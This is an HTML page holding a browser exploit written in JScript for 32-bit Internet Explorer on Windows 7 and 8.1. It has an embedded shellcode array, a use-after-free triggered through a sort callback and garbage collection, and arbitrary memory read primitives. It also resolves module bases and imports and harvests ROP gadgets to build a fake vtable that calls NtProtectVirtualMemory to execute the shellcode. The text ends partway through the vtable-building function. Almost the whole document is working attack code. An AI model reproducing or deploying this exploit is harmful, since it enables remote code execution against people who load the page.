<!DOCTYPE html>
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
<script language="JScript.Compact">

var WindowsVersion = 8.1;
var WindowsArch = "x64"; // Can be "x64" or "x86". Note that this is the OS architecture, not the IE architecture (this exploit is for 32-bit IE only).
var Shellcode = [ 0x0004a164, 0x002d0000, 0x94000010, 0x68e58960, 0x00038f88, 0x00003ce8, 0xb81a6800, 0xe8500006, 0x0000007d, 0x7068646a, 0x89656e77, 0x656e68e1, 0x6f680074, 0x682e7272, 0x2d747365, 0x726f6668, 0x77776872, 0xe2892e77, 0x5152006a, 0xd0ff006a, 0x9461ec89, 0xe58955c3, 0x30be5657, 0x64000000, 0x0c408bad, 0x8918788b, 0xebc031fe, 0x74f73904, 0x74f68528, 0x245e8d24, 0x1474db85, 0x85044b8b, 0x6a0d74c9, 0x5de85101, 0x3b000001, 0x06740845, 0x368bc031, 0x468bd7eb, 0x895f5e10, 0x04c25dec, 0xe5895500, 0x0230ec81, 0x458b0000, 0xf8458908, 0x03f8558b, 0xc0833c42, 0xf0458904, 0x8914c083, 0xc289f445, 0x0308458b, 0x4a8b6042, 0xd04d8964, 0x89fc4589, 0x08458bc2, 0x89204203, 0x558bec45, 0x08458bfc, 0x89244203, 0x558be445, 0x08458bfc, 0x891c4203, 0xc031e845, 0x89e04589, 0x458bd845, 0x18408bfc, 0x0fe0453b, 0x0000d286, 0xe0458b00, 0x00850c8d, 0x8b000000, 0x458bec55, 0x11040308, 0x6ad44589, 0xbde85000, 0x3b000000, 0x850f0c45, 0x000000a1, 0x8de0458b, 0x458b0014, 0x04b70fe4, 0x850c8d02, 0x00000000, 0x8be8558b, 0x04030845, 0xd8458911, 0x89fc4d8b, 0xd05503ca, 0x7f7cc839, 0x7b7dd039, 0x00d845c7, 0x31000000, 0xd09d8dc9, 0x8afffffd, 0xfa800814, 0x80207400, 0x15752efa, 0x642e03c7, 0xc3836c6c, 0x0003c604, 0xfed09d8d, 0xeb41ffff, 0x411388de, 0xc6d8eb43, 0x9d8d0003, 0xfffffdd0, 0xe853006a, 0x0000003c, 0xfea3e850, 0xc085ffff, 0x45892974, 0x8d006adc, 0xfffed095, 0x21e852ff, 0x50000000, 0xe8dc75ff, 0xfffffed1, 0xebd84589, 0xe0458d0a, 0x1fe900ff, 0x8bffffff, 0xec89d845, 0x0008c25d, 0x57e58955, 0x8b084d8b, 0xdb310c7d, 0x74003980, 0x01b60f14, 0xb60f600c, 0xd1d301d0, 0xff8541e3, 0xeb41ea74, 0x5fd889e7, 0xc25dec89, 0x00650008, ];

////////
////////
// Debug/timer code
////////

var EnableDebug = 1;
var EnableTimers = 0;
var AlertOutput = 1;
var TimeStart;
var ReadCount;

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

////////
////////
// UAF/untracked variable creation code
////////

var UntrackedVarSet;
var VarSpray;
var VarSprayCount = 20000; // 200 GcBlocks
var NameListAnchors;
var NameListAnchorCount = 0; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
var SortDepth = 0;
var SortArray = new Array(); // Array to be "sorted" by glitched method

function GlitchedSort(untracked_1, untracked_2) { // goes to depth of 227 before freeing GcBlocks, which only happens once.
    untracked_1 = VarSpray[SortDepth*2];
    untracked_2 = VarSpray[SortDepth*2 + 1];
    
    if(SortDepth > 150) {
        VarSpray = new Array(); // Erase references to sprayed vars within GcBlocks
        CollectGarbage(); // Free the GcBlocks
        UntrackedVarSet.push(untracked_1);
        UntrackedVarSet.push(untracked_2);
        return 0;
    }
    
    SortDepth += 1;
    SortArray[SortDepth].sort(GlitchedSort);
    UntrackedVarSet.push(untracked_1);
    UntrackedVarSet.push(untracked_2);
    return 0;
}

function NewUntrackedVarSet() {
    SortDepth = 0;
    VarSpray = new Array();
    NameListAnchors = new Array();
    UntrackedVarSet = new Array();
    for(i = 0; i < NameListAnchorCount; i++) NameListAnchors[i] = new Object(); // Overlay must happen before var spray
    for(i = 0; i < VarSprayCount; i++) VarSpray[i] = new Object();
    CollectGarbage();
    SortArray[0].sort(GlitchedSort); // Two untracked vars will be passed to this method by the JS engine
}

////////
////////
// UAF re-claim/mutable variable code (used for arbitrary read)
////////

var AnchorObjectsBackup;
var LeakedAnchorIndex = -1;
var SizerPropName = Array(570).join('A');
var MutableVar;
var ReClaimNameList;

function ReClaimIndexNameList(Value, PropertyName) {
    CollectGarbage(); // Cleanup - note that removing this has not damaged stability of the exploit in any of my own tests and its removal significantly improved exploit performance (each arbitrary read is about twice as fast). I've left it here from maxspl0it's original version of the exploit to ensure stability.
    AnchorObjectsBackup[LeakedAnchorIndex] = null; // Delete the anchor associated with the leaked NameList allocation
    CollectGarbage(); // Free the leaked NameList
    AnchorObjectsBackup[LeakedAnchorIndex] = new Object();
    AnchorObjectsBackup[LeakedAnchorIndex][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
    AnchorObjectsBackup[LeakedAnchorIndex]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
    AnchorObjectsBackup[LeakedAnchorIndex]["\u0005"] = 1;
    AnchorObjectsBackup[LeakedAnchorIndex][PropertyName] = Value; // The mutable variable
    ReadCount++;
}

// Different strategy is possible here: repeatedly wipe the specific anchor index and attempt to re-claim it: verifying this was successful could be done by passing the intended new VAR value to this function, and then checking if the mutable var value is equal to this value after every re-claim attempt.
function ReClaimBackupNameLists(Value, PropertyName) { // This function is assuming the leaked anchor index is within the range being freed/re-allocated
    //CollectGarbage(); // Cleanup
    for(i = 0; i < NameListAnchorCount; i++) AnchorObjectsBackup[i] = null;//NameListAnchorCount
    CollectGarbage(); // Free the leaked NameList
    
    for(i = 0; i < NameListAnchorCount; i++) {
        AnchorObjectsBackup[i] = new Object();
        AnchorObjectsBackup[i][SizerPropName] = 1; // 0x17a property name size for 0x648 NameList allocation size
        AnchorObjectsBackup[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        AnchorObjectsBackup[i]["\u0005"] = 1;
        AnchorObjectsBackup[i][PropertyName] = Value; // The mutable variable
    }
}

function CreateVar64(type, obj_ptr_lower, obj_ptr_upper, next_ptr_lower, next_ptr_upper) {
    var charCodes = new Array();
    charCodes.push(
         // type
        type, 0, 0, 0,

         // obj_ptr
        obj_ptr_lower & 0xffff, (obj_ptr_lower >> 16) & 0xffff, obj_ptr_upper & 0xffff, (obj_ptr_upper >> 16) & 0xffff,

        // next_ptr
        next_ptr_lower & 0xffff, (next_ptr_lower >> 16) & 0xffff, next_ptr_upper & 0xffff, (next_ptr_upper >> 16) & 0xffff
        );
    return String.fromCharCode.apply(null, charCodes);
}

function LeakByte(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 2, Address.hi, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return (MutableVar.length >> 15) & 0xff; // Shift to align and get the byte.
}

function LeakWord(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 2, Address.hi, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
}

function LeakDword(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 2, Address.hi, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 4, Address.hi, 0, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LowWord + (HighWord << 16);
}

function LeakQword(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 2, Address.hi, 0, 0));
    var LowLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 4, Address.hi, 0, 0));
    var LowHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
	ReClaimNameList(0, CreateVar64(0x8, Address.lo + 6, Address.hi, 0, 0));
    var HighLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.lo + 8, Address.hi, 0, 0));
    var HighHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
	return from_int52(to_int52(HighLow + (HighHigh << 16), LowLow + (LowHigh << 16)));
}

function LeakObjectAddress(ObjVarAddress, ObjVarValue) { // This function does not always work, there are some edge cases. For example if a BSTR is declared var A = "123"; it works fine. However, var A = "1"; A += "23"; resuls in multiple layers of VARs referencing VARs and this function will no longer get the actual BSTR address.
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.lo + 8 + 2, ObjVarAddress.hi, 0, 0));
    var LowLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.lo + 8 + 4, ObjVarAddress.hi, 0, 0));
    var LowHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
	ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.lo + 8 + 6, ObjVarAddress.hi, 0, 0));
    var HighLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.lo + 8 + 8, ObjVarAddress.hi, 0, 0));
    var HighHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
	var DerefObjVarAddress = from_int52(to_int52(HighLow + (HighHigh << 16), LowLow + (LowHigh << 16) + 8));
    return LeakQword(DerefObjVarAddress); // The concept here is to turn the property name (the mutable var) into a BSTR VAR pointing at its own VVAL (which starts with another, real VAR). The real VAR can be set dynamically to the address of the desired object. So there are two stages: first to read the object pointer out of the VAR within the final VVAL, and then to leak the object pointer of the VAR it is pointing to (skipping +8 over its Type field)
}

////////
////////
// PE parsing/EAT and IAT resolution code
////////

function DiveModuleBase(Address) {
    Address.lo = (Address.lo & 0xFFFF0000) + 0x4e; // Offset of "This program cannot be run in DOS mode" in PE header.
    
    while(true) {
        if(LeakWord(Address) == 0x6854) { // 'hT'
            if(LeakWord(from_int52(to_int52(Address.hi, Address.lo + 2))) == 0x7369) { // 'si'

				return from_int52(to_int52(Address.hi, Address.lo - 0x4e));
            }
        }
        
        Address.lo -= 0x10000;
    }
    
    return 0;
}
/*
function ResolveExport(ModuleBase, TargetExportNameTable) {
    var FileHdr = LeakDword(ModuleBase + 0x3c);
    var ExportDataDir = ModuleBase + FileHdr + 0x78;
    
    if(ExportDataDir) {
        var EATRva = LeakDword(ExportDataDir);
        var TotalExports = LeakDword(ModuleBase + EATRva + 0x14);
        var AddressRvas = LeakDword(ModuleBase + EATRva + 0x1C);
        var NameRvas = LeakDword(ModuleBase + EATRva + 0x20);
        var OrdinalRvas = LeakDword(ModuleBase + EATRva + 0x24);
        var MaxIndex = TotalExports;
        var MinIndex = 0;
        var CurrentIndex = Math.floor(TotalExports / 2);
        var TargetTableIndex = 0;
        var BinRes = 0;
        
        while(TotalExports) { 
            var CurrentNameRva = LeakDword(ModuleBase + NameRvas + 4*CurrentIndex);

            while (TargetTableIndex < TargetExportNameTable.length) {
                CurrentNameWord = LeakWord(ModuleBase + (CurrentNameRva + (4 * TargetTableIndex)));
                var ExportNameWord = (TargetExportNameTable[TargetTableIndex] & 0x0000FFFF);
                var SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                BinRes = BinaryCmp(ExportNameWord, SanitizedCurrentNameWord);
                //DebugLog("Compaaring 0x" + ExportNameWord.toString(16) + " to sanitized 0x" + SanitizedCurrentNameWord.toString(16) + " result: " + BinRes.toString(10));

                if(!BinRes) {
                    //DebugLog("Matched!");
                    ExportNameWord = ((TargetExportNameTable[TargetTableIndex] & 0xFFFF0000) >> 16);
                    
                    if(ExportNameWord != 0) { // Special case: final WORD of name array is 0, consider this a match
                        CurrentNameWord = LeakWord(ModuleBase + (CurrentNameRva + (4 * TargetTableIndex)) + 2);
                        SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                        BinRes = BinaryCmp(ExportNameWord, SanitizedCurrentNameWord);
                        //DebugLog("Compaaring 0x" + ExportNameWord.toString(16) + " to sanitized 0x" + SanitizedCurrentNameWord.toString(16) + " result: " + BinRes.toString(10) + " at index " + TargetTableIndex.toString(10));

                        if(!BinRes) {
                            //DebugLog("Matched!");
                            
                            if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
                                Ordinal = LeakWord(ModuleBase + OrdinalRvas + 2*CurrentIndex);
                                MainExport = (ModuleBase + LeakDword(ModuleBase + AddressRvas + 4*Ordinal));
                                return [ MainExport , CurrentIndex];
                            }
                            else {
                                //DebugLog("Chunks are equal but not at final index, current is: " + TargetTableIndex.toString(10));
                            }
                            
                            TargetTableIndex++;
                        }
                        else {
                            TargetTableIndex = 0;
                            break;
                        }
                    }
                    else {
                        if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
                            Ordinal = LeakWord(ModuleBase + OrdinalRvas + (2 * CurrentIndex));
                            MainExport = (ModuleBase + LeakDword(ModuleBase + AddressRvas + (4 * Ordinal)));
                            return [ MainExport, CurrentIndex];
                        }
                        else {
                            alert("Fatal error during export lookup: target export name array contained a NULL byte not at the end of its final element");
                        }
                    }
                }
                else {
                    TargetTableIndex = 0;
                    break;
                }
            }
            
            if(BinRes == 1) { // Target is greater than what it was compared to: reduce current index
                if(MaxIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit max");
                    break;
                }
                
                MaxIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MinIndex) / 2);
            } 
            else if (BinRes == -1) { // Target is less than what it was compared to: enhance current index
                if(MinIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit min");
                    break;
                }
                
                MinIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MaxIndex) / 2);
            }
            
            if(CurrentIndex == MaxIndex && CurrentIndex == MinIndex) {
                DebugLog("Failed to find export: current, min and max indexes are all equal");
                break;
            }
        }
    }
    
    return [0,0];
}

function CheckINTThunk(ModuleBase, INTThunkRva, TargetImportNameTable) {
    var INTThunkValue = LeakDword(ModuleBase + INTThunkRva);
    
    if(INTThunkValue == 0) {
        return -1;
    }
    
    if((INTThunkValue & 0x80000000) == 0) { // Only parse non-orginal INT entries
        var ImportNameAddress = (ModuleBase + INTThunkValue + 2); // The INT thunk is an RVA pointing at a IMAGE_IMPORT_BY_NAME struct. Skip the hint field in this struct to point directly to the ASCII import name.

        if(StrcmpLeak(TargetImportNameTable, ImportNameAddress)) {
            return 1;
        }
    }
    
    return 0;
}

function ResolveImport(ModuleBase, HintIndex, TargetModuleNameTable, TargetImportNameTable) {
    var ExtractedAddresss = 0;
    var FileHdr = LeakDword(ModuleBase + 0x3c);
    var ImportDataDir = ModuleBase + FileHdr + 0x80; // Import data directory
    var ImportRva = LeakDword(ImportDataDir);
    var ImportSize = LeakDword(ImportDataDir + 0x4); // Get the size field of the import data dir
    var CurrentNameDesc = ModuleBase + ImportRva;
    
    while(ImportSize != 0) {
        NameField = LeakDword(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer
        
        if(NameField != 0) {
            if(StrcmpLeak(TargetModuleNameTable, ModuleBase + NameField)) {
                // Found the target module by name. Walk its INT to check each name.
                
                var HighIATIndex = (HintIndex + 1);
                var LowIATIndex = (HintIndex - 1);
                var BaseINTThunkRva = (LeakDword(CurrentNameDesc + 0x0));
                var BaseIATThunkRva = (LeakDword(CurrentNameDesc + 0x10));
                var ResolvedIATIndex = -1;
                
                if(BaseINTThunkRva == 0) {
                    alert("INT is empty in target module");
                }
                
                // Start by checking the INT at the specified hint index
                
                if(CheckINTThunk(ModuleBase, BaseINTThunkRva + (HintIndex * 4), TargetImportNameTable)) {
                    ExtractedAddresss = LeakDword(ModuleBase + BaseIATThunkRva);
                    break;
                }
                
                // Specified import was not found at the provided hint index. Walk the INT forward/backward in unison from the hint index.
                
                var HighINTThunkRva = (BaseINTThunkRva + (HighIATIndex * 4));
                var LowINTThunkRva = (BaseINTThunkRva + (LowIATIndex * 4));
                var HitINTThunkCeiling = 0;
                
                while(true) {
                    if(!HitINTThunkCeiling) {
                        var ThunkRes = CheckINTThunk(ModuleBase, HighINTThunkRva, TargetImportNameTable);
                        
                        if(ThunkRes == -1) {
                            HitINTThunkCeiling = 1;
                        }
                        else if(ThunkRes) {
                            ExtractedAddresss = LeakDword(ModuleBase + BaseIATThunkRva + (HighIATIndex * 4));
                            ResolvedIATIndex = HighIATIndex;
                            break;
                        }
                        else {
                            HighINTThunkRva += 4;
                            HighIATIndex++;
                        }
                    }
                    
                    if(LowINTThunkRva >= BaseINTThunkRva) {
                        if(CheckINTThunk(ModuleBase, LowINTThunkRva, TargetImportNameTable)) {
                            ExtractedAddresss = LeakDword(ModuleBase + BaseIATThunkRva + (LowIATIndex * 4));
                            ResolvedIATIndex = LowIATIndex;
                            break;
                        }
                        
                        LowINTThunkRva -= 4;
                        LowIATIndex--;
                    }
                }
                
                if(ExtractedAddresss != 0) {
                    DebugLog("Identified target import at IAT index " + ResolvedIATIndex.toString(10));
                    break;
                }
            }
            
            ImportSize -= 0x14;
            CurrentNameDesc += 0x14; // Next import descriptor in array
        }
        else {
            break;
        }
    }
    
    return ExtractedAddresss;
}
*/
function ExtractBaseFromImports(ModuleBase, TargetModuleNameTable) { // Grab the first IAT entry of a function within the specified module
    var ExtractedAddresss = 0;
    var FileHdrRva = LeakDword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + 0x3c)));
    var ImportDataDirAddress = from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + FileHdrRva + 0x90)); // Import data directory
    var ImportRva = LeakDword(ImportDataDirAddress);
    var ImportSize = LeakDword(from_int52(to_int52(ImportDataDirAddress.hi, ImportDataDirAddress.lo + 0x4))); // Get the size field of the import data dir
    var DescriptorAddress = from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + ImportRva));
    
    while(ImportSize != 0) {
        NameRva = LeakDword(from_int52(to_int52(DescriptorAddress.hi, DescriptorAddress.lo + 0xc))); // 0xc is the offset to the module name pointer
        
        if(NameRva != 0) {
            if(StrcmpLeak(TargetModuleNameTable, from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + NameRva)))) {
                ThunkRva = LeakDword(from_int52(to_int52(DescriptorAddress.hi, DescriptorAddress.lo + 0x10)));
                ExtractedAddresss = LeakQword(from_int52(to_int52(ModuleBase.hi, ModuleBase.lo + ThunkRva + 8))); // +8 since __imp___C_specific_handler can cause issues when imported in some jscript instances
                break;
            }
            
            ImportSize -= 0x14;
            DescriptorAddress.lo += 0x14; // Next import descriptor in array
        }
        else {
            break;
        }
    }
    
    return ExtractedAddresss;
}

////////
////////
// Dynamic ROP chain creation code
////////
/*
function HarvestGadget(HintExportAddress, MaxDelta, Data, DataMask, MagicOffset) {
    var MaxHighOffset = (HintExportAddress + MagicOffset + MaxDelta);
    var MinLowOffset = ((HintExportAddress + MagicOffset) - MaxDelta);
    var LeakAddress = HintExportAddress + MagicOffset;
    var LeakFunc = LeakDword; // In nthe event a 0x00FFFFFF mask is used, LeakDword will be used, but will still be filtered
    
    if(MinLowOffset < HintExportAddress) {
        MinLowOffset = HintExportAddress;
    }
    
    DebugLog("Hunting for gadget 0x" + Data.toString(16) + " betwee 0x" + MinLowOffset.toString(16) + " and 0x" + MaxHighOffset.toString(16) + " starting from 0x" + LeakAddress.toString(16));
    
    if(DataMask == 0x0000FFFF) {
        LeakFunc = LeakWord;
    }
    else {
        alert("Unhaandled data mask for gadget harvest");
        return 0;
    }
    
    if((LeakFunc(LeakAddress) & DataMask) == Data) {
        DebugLog("Found gadget at expected delta of " + MagicOffset.toString(16));
    }
    else {
        var HighAddress = (LeakAddress + 1);
        var LowAddress = LeakAddress - 1;

        LeakAddress = 0;

        while(LowAddress >= MinLowOffset || HighAddress < MaxHighOffset) {
            if(LowAddress >= MinLowOffset) {
                if((LeakFunc(LowAddress) & DataMask) == Data) {
                    DebugLog("Found gadget from scan below magic at " + LowAddress.toString(16));
                    LeakAddress = LowAddress;
                    break;
                }
                
                LowAddress -= 1;
            }
            
            if(HighAddress < MaxHighOffset) {
                if((LeakFunc(HighAddress) & DataMask) == Data) {
                    DebugLog("Found gadget from scan above magic at " + HighAddress.toString(16));
                    LeakAddress = HighAddress;
                    break;
                }
                
                HighAddress += 1;
            }
        }
    }
    
    return LeakAddress;
}

function ResolveNtProtectProxyStub(ScanAddress, MaxOffset) {*/
    /*
    Windows 7 x64 NTDLL Wow64 (EMET 5.5 hook enabled)
    
    7725001A | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
    77250021 | 83C4 04                  | add esp,4                               |
    77250024 | C2 0800                  | ret 8                                   |
    77250027 | 90                       | nop                                     |
    77250028 | E9 BB0857BF              | jmp 367C08E8                            | <- NtProtectVirtualMemory
    7725002D | CC                       | int3                                    |
    7725002E | CC                       | int3                                    |
    7725002F | 8D5424 04                | lea edx,dword ptr ss:[esp+4]            |
    77250033 | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
    7725003A | 83C4 04                  | add esp,4                               |
    7725003D | C2 1400                  | ret 14                                  |
    77250040 | B8 4E000000              | mov eax,4E                              | 4E:'N'
    77250045 | 33C9                     | xor ecx,ecx                             |
    77250047 | 8D5424 04                | lea edx,dword ptr ss:[esp+4]            |
    7725004B | 64:FF15 C0000000         | call dword ptr fs:[C0]                  |
    77250052 | 83C4 04                  | add esp,4                               |
    77250055 | C2 1400                  | ret 14                                  |
    
    Windows 7 x86 NTDLL 32-bit (EMET hook disabled)
    
    77305F18 | B8 D7000000              | mov eax,D7                              | <- NtProtectVirtualMemory
    77305F1D | BA 0003FE7F              | mov edx,<&KiFastSystemCall>             | <- stub resolved here
    77305F22 | FF12                     | call dword ptr ds:[edx]                 |
    77305F24 | C2 1400                  | ret 14                                  |
    */
    /*
    var Offset = 0;
    var LastMovEaxAddress = 0;
    var ProxyStubAddress = 0;
    var RetnScenarioOne = 0;
    var RetnScenarioTwo = 0;
    
    // Scan forward searching for 0xB8 opcode. Once one is found, scan forward until 0xC2 0x14 0x00 is found. Proxy stub address will be the address of the last 0xB8 opcode +5.
    
    while(Offset < MaxOffset) {
        var LeakAddress = ScanAddress + Offset;
        var LeakedWord = LeakWord(LeakAddress);
        var ByteOne = (LeakedWord & 0x00FF);
        var ByteTwo = ((LeakedWord & 0xFF00) >> 8);
        
        if(ByteOne == 0xB8) {
            LastMovEaxAddress = LeakAddress;
        }
        else if(ByteTwo == 0xB8) {
            LastMovEaxAddress = (LeakAddress + 1);
        }
        
        else if(LastMovEaxAddress != 0) {
            if(!RetnScenarioOne) {
                if(ByteOne == 0xc2 && ByteTwo == 0x14) {
                    RetnScenarioOne = 1;
                }
            }
            else {
                if(ByteOne == 0x00) {
                    ProxyStubAddress = (LastMovEaxAddress + 5);
                    DebugLog("NtProtectVirtualMemory proxy stub scenario one scan success: 0x" + ProxyStubAddress.toString(16));
                    break;
                }
                else {
                    RetnScenarioOne = 0;
                }
            }
            
            if(!RetnScenarioTwo) {
                if(ByteTwo == 0xC2) {
                    RetnScenarioTwo = 1;
                }
            }
            else {
                if(ByteOne == 0x14 && ByteTwo == 0x00) {
                    ProxyStubAddress = (LastMovEaxAddress + 5);
                    DebugLog("NtProtectVirtualMemory proxy stub scenario two scan success: 0x" + ProxyStubAddress.toString(16));
                    break;
                }
                else {
                    RetnScenarioTwo = 0;
                }
            }
        }
        
        Offset += 2;
    }
    
    return ProxyStubAddress;
}

function ResolveGadgetSet(MsvcrtBase) { // Dynamically resolve gadget addresses via delta from export addresses - MSVCRT.DLL is used to harvest gadgets as its EAT is not protected by EAF/EAF+
    var GadgetSetObj = new Object();
    
    DebugLog("Dynamically resolving ROP gadget addresses from MSVCRT.DLL export address hints from base " + MsvcrtBase.toString(16));
    
    // XCHG EAX, ESP ; RET
    // For Win7 x64 Wow64:
    // __libm_sse2_log10:0x0008dc45 (+0x4f0) <- 0x0008e135 -> (+0x670) __libm_sse2_log10f:0x0008e7a5
    // For Win8.1: 
    //__libm_sse2_log10:0x000a9b80 (+0x4e5) <- 0x000aa065 -> (+0x67b) __libm_sse2_log10f:0x000aa6e0

    var ExportPair = ResolveExport(MsvcrtBase, [0x696c5f5f, 0x735f6d62, 0x5f326573, 0x31676f6c, 0x00000030]); // 'il__' 's_mb' '_2es' '1gol' '0'
    
    if(ExportPair[0]) {
		var MagicOffset = 0;
		
		if(WindowsVersion == 7) {
			MagicOffset = 0x4f0; // Win7 x64
		}
		else if(WindowsVersion == 8.1) {
			MagicOffset = 0x4e5;
		}
		
        GadgetSetObj.StackPivot = HarvestGadget(ExportPair[0], 0x500, 0xc394, 0x0000FFFF, MagicOffset);
        
        if(GadgetSetObj.StackPivot != 0) {
            DebugLog("Stack pivot resolved to: " + GadgetSetObj.StackPivot.toString(16));
            GadgetSetObj.RopNop = (GadgetSetObj.StackPivot + 1);
            
            // POP EAX ; RET
            // Win7/8 (+0x13 and same export on both)
            // _safe_fdivr:0x00031821 (+0x13) <- 0x00031834 -> (+0x208) _adj_fprem:0x00031a3c

            ExportPair = ResolveExport(MsvcrtBase, [0x6661735f, 0x64665f65, 0x00727669]); // 'fas_' 'df_e' 'rvi'
            
            if(ExportPair[0]) {
                GadgetSetObj.PopEax = HarvestGadget(ExportPair[0], 0x100, 0xc358, 0x0000FFFF, 0x00000013); // Win7/8.1 have same offset
                
                if(GadgetSetObj.PopEax) {
                    return GadgetSetObj;
                }
                else {
                    DebugLog("Failed to resolve POP EAX gadget address");
                }
            }
            else {
                DebugLog("Failed to resolve msvcrt.dll!_safe_fdivr as export hint");
            }
        }
        else {
            DebugLog("Failed to resolve stack pivot gadget address");
        }
    }
    else {
        DebugLog("Failed to resolve msvcrt.dll!__libm_sse2_log10 as export hint");
    }
    
    return null;
}

function CreateFakeVtable(FakeVtablePaddingSize, VtableSize, NtProtectAddress, ShellcodeAddress, RopGadgetSet, WritableAddress) {
    // [Padding]
    // [ROPNOP sled]
    // [Stack alignment gadget]
    // [Stack pivot]
    // [Set EAX to SYSCALL #]
    // [NtProtoectVirtualMemry] 
    // [Shellcode address] <- NtProtoectVirtualMemry return
    // [NtProtoectVirtualMemry parameters]
    // [Stack pivot]
    // [Padding]
    
    var FakeVtable = "";
    var Y = 0;
    var PaddingArrayLen = FakeVtablePaddingSize / 4;
    var TotalObjLen = ((FakeVtablePaddingSize + VtableSize) / 2);
    var PaddingArray = [];
    var SyscallNumber;

    for(i = 0; i < PaddingArrayLen; i++) {
        PaddingArray[i] = 0x11111111;
    }
    
    FakeVtable += ConvertDwordArrayToBytes(PaddingArray);
    DebugLog("Final stack pivot for vtable at " + RopGadgetSet.StackPivot.toString(16));
    
    while (FakeVtable.length < TotalObjLen) {
        if(Y == 0x9c) {
            FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.StackPivot]);
        }
        else if(Y == 0x98) {
            FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.PopEax]);
        }
        else {
            FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.RopNop]);
        }
        
        Y += 4;
    }
    
    // Layout of storage address region
    // +0x0 | Original ESP
    // +0x4 | Shellcode address
    // +0x8 | Shellcode size
    // +0xC | Old protection
    
    FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.PopEax]);
    
    if(WindowsVersion == 8.1) {
        SyscallNumber = 0x4F; // Windows 8.1 x64 NtProtectVirtualMemory SYSCALL #
    }
    else {
        if(WindowsArch == "x64") {
            SyscallNumber = 0x4D; // Windows 7 x64 SP0/SP1 Wow64 NtProtectVirtualMemory SYSCALL #
        }
        else if(WindowsArch == "x86") {
            SyscallNumber = 0xD7; // Windows 7 x86 SP0/SP1 32-bit NtProtectVirtualMemory SYSCALL #
        }
    }
    
    // NTSTATUS NtProtectVirtualMemory(IN HANDLE ProcessHandle, IN OUT PVOID *BaseAddress, IN OUT PULONG RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect); 
    
    FakeVtable += ConvertDwordArrayToBytes([SyscallNumber]);
    FakeVtable += ConvertDwordArrayToBytes([NtProtectAddress]);
    FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.RopNop]); // Return address
    FakeVtable += ConvertDwordArrayToBytes([0xFFFFFFFF]);
    FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0x4]);
    FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0x8]);
